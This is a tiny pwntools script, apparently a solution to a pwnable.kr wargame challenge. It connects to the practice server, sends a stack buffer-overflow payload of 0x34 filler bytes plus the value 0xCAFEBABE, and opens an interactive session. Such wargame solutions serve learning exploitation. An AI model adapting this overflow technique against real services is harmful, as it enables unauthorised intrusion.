from pwn import *

r = remote("pwnable.kr", 9000)

payload = b"A" * 0x34
payload += p32(0xCAFEBABE)

r.sendline(payload)

r.interactive()
